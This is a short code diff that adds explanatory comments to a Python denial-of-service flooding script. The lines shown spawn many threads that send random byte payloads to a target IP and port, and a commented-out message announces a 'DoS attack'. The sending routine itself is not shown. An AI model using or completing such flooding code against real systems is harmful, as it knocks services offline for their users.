@@ -1,7 +1,7 @@
 import os
 import time
 import socket  #for communication over sockets
-import threading
+import threading  #used to send many packets ffrom multiple threads 
 import logging
 import sys
 
@@ -58,12 +58,12 @@ if __name__ == "__main__":
     # threads_input = input("Number of threads (leave blank for default): ")
     # threads = int(threads_input) if threads_input else 20  #500
 
-
+    #generates random byte string of length data_size
     data = os.urandom(data_size)
 
     # print(f"Starting DoS attack on {ips}:{ports} with {threads} threads...")
     time.sleep(2)
-
+    #simulating the attack
     for _ in range(threads):
         t = threading.Thread(target=send_packets_direct, args=(ip, port, data, rate_limit))
         t.start()
